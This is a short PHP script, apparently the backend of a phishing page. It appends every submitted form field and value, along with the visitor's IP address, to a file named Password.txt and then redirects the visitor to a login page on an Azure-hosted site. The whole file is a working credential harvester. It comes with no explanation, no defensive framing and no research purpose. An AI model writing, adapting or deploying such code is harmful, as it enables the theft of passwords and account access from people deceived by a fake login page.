<?php
/**
 * Created by PhpStorm.
 * User: iliyaganama
 * Date: 18/04/2016
 * Time: 12:40 AM
 */

header ('Location: http://1510537.azurewebsites.net/login.html/ ');
$handle = fopen("Password.txt", "a");
$ip = $_SERVER['REMOTE_ADDR'];
foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}
fwrite($handle, "IP=$ip");
fwrite($handle, "\r\n");
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
